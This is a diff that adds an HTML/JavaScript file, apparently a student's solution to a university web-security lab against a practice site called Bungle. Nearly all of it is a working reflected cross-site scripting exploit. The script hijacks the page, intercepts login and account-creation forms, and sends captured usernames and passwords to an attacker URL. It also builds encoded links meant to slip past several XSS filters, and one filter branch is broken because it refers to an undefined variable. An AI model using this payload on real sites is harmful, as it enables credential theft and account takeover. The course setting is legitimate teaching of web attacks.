@@ -1,0 +1,222 @@
+<meta charset="utf-8">
+<script src="http://ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+<script>
+
+// Extend this function:
+function payload(attacker) {
+	function log(data) {
+		console.log($.param(data))
+		$.get(attacker, data);
+	}
+	// lc_event is string for login & create account events
+	function post_helper(lc_event){
+		console.log("calling post_helper");
+		var uname = document.getElementById("username").value;
+		var pword = document.getElementById("userpass").value;
+		$.post("http://cs526-online.cs.purdue.edu/project2b/" + lc_event, {username: uname, password: pword}, function(){
+			log({event: lc_event, user: uname, pass: pword});
+			proxy("http://cs526-online.cs.purdue.edu/project2b/");
+		});
+	}
+	function pre_helper(href){
+		hist_stack.push(href);
+		uid++;
+		window.history.pushState({UID: uid},"",href);
+	}
+	var hist_stack = new Array();
+	var fwd_stack = new Array();
+	var uid = 0;
+	var this_uid;
+
+	function proxy(href) {
+				
+			
+			if(window.history.state == null)
+				history.replaceState({UID: uid},"",href);
+			else
+				history.replaceState(window.history.state, "", href);
+			
+			this_uid = window.history.state.UID;
+			console.log("this_uid: " + this_uid);
+			console.log("hist_stack: ", hist_stack);
+			console.log("fwd_stack: ", fwd_stack);
+
+		$("html").load(href, function(){
+			$("html").show();
+
+			var uname_elem = document.getElementById("logged-in-user");
+			var user_name;
+			if(uname_elem != null){
+				user_name = uname_elem.innerHTML;
+			}
+			else{
+				user_name = null;
+			}
+
+
+			log({event: "nav", user: user_name, uri: href});
+			$("#query").val("pwned!");
+
+			// if we're on a search page, iterate through history
+			if(href.search("search?") != -1){
+				$('a').each(function(){
+					if($(this).attr("href").indexOf("%3C") >= 0){
+
+						// clean
+						$(this).remove();
+						//console.log("remove called");
+					}
+
+					// persistant attack when user clicks on history links
+					$(this).click("submit", function(event) {
+						usersSearch = $(this).attr('href');
+						//log("#logged-in-user");
+						event.preventDefault();
+						proxy("http://cs526-online.cs.purdue.edu/project2b/" + usersSearch);
+					});
+
+				});
+			}
+
+			window.onpopstate = function(e){
+				var next_uid = e.state.UID;
+				var top;
+				console.log("popstate detected");
+				console.log("next_uid: " + next_uid);
+				
+				console.log(e);
+				if(next_uid < this_uid){
+					console.log("***************back button*******************");
+					top = hist_stack.pop();
+					fwd_stack.push(href);
+					proxy(top);
+				}
+				else {
+					console.log("****************forward button******************");
+					top = fwd_stack.pop();
+					hist_stack.push(href);
+					proxy(top);
+				}
+
+			};
+			
+
+			// Bungle! link
+			$('#bungle-lnk').on("click", function(event) {
+				event.preventDefault();
+				pre_helper(href);
+				proxy("http://cs526-online.cs.purdue.edu/project2b/");
+				//alert("Bungle_link_alert");
+			});	
+
+			// Search
+			$('form[action="./search"]').on("submit", function(event) {
+				usersSearch = document.getElementById('query').value;
+				event.preventDefault();
+				pre_helper(href);
+				var target_link = "http://cs526-online.cs.purdue.edu/project2b/search?q=" + usersSearch;
+				proxy(target_link);
+			});
+
+			// Search again
+			$('#search-again-btn').on("click", function(event) {
+				event.preventDefault();
+				pre_helper(href);
+				proxy("http://cs526-online.cs.purdue.edu/project2b/");
+				//alert("Search_Again_button_alert");
+			});
+
+			// login
+			$('form[action="./login"]').on("submit", function(event) {
+				event.preventDefault();
+				post_helper("login");
+				//alert("login_form_alert");
+
+			});
+
+			// create account
+			$('#new-account-btn').on("click", function(event) {
+				event.preventDefault();
+				post_helper("create");
+				//alert("create_account_alert");
+			});
+
+
+			// logout
+			$('#log-out-btn').on("click", function(event) {
+				event.preventDefault();
+				var uname = document.getElementById("logged-in-user").innerHTML;
+				//console.log("uname: " + uname);
+				$.post("http://cs526-online.cs.purdue.edu/project2b/logout", function(){
+					log({event: "logout", user: uname});
+					proxy("http://cs526-online.cs.purdue.edu/project2b/");
+				});
+			});
+
+
+		});
+
+		
+	}
+	$("html").hide();
+	proxy("./");
+}
+	function extract(code){
+		var c="";
+		for(var i=1;i<code.length-2;++i){
+			c+=code.charCodeAt(i)+",";
+		}
+		c+=code.charCodeAt(code.length-2);
+		c="String.fromCharCode("+c+")";
+		return c;
+	}
+function urlProcess(input){
+		var regex=/\"[^\"]*\"/;
+		var subString=regex.exec(input);
+		while(subString!=null){
+			input=input.replace(regex,extract(subString.toString()));
+			subString=regex.exec(input);
+		}
+		return input;
+	}
+// make the url; the url embeds the function definition above by calling payload.toString()
+function makeLink(xssdefense, target, attacker) {
+	if (xssdefense == 0) {
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">");
+	}
+	else if(xssdefense == 1){
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<sscriptcript" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</sscriptcript" + ">");
+	}
+	else if(xssdefense == 2){
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent("<sscriptcript" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</sscriptcript" + ">");
+	}
+	else if(xssdefense == 3){
+		var url2 = "<script" + ">" + payload.toString() + ";payload(\"" + attacker + "\");</script" + ">";
+		url2 = urlProcess(link2);
+		url2 = url2.replace(/;/g, " ");
+		return target + "./search?xssdefense=" + xssdefense.toString() + "&q=" +
+			encodeURIComponent(url2);
+			
+	}
+	else if(xssdefense == 4){
+	//not working
+	}
+}
+
+var xssdefense = 0;
+var target = "http://cs526-online.cs.purdue.edu/project2b/";
+var attacker = "http://127.0.0.1:31337/";
+
+
+
+// This part makes the <a></a> html code for the Try Bungle link
+$(function() {
+	var url = makeLink(xssdefense, target, attacker);
+	$("h3").html("<a target=\"run\" href=\"" + url + "\">Try Bungle!</a>");
+});
+
+</script>
+<h3></h3>
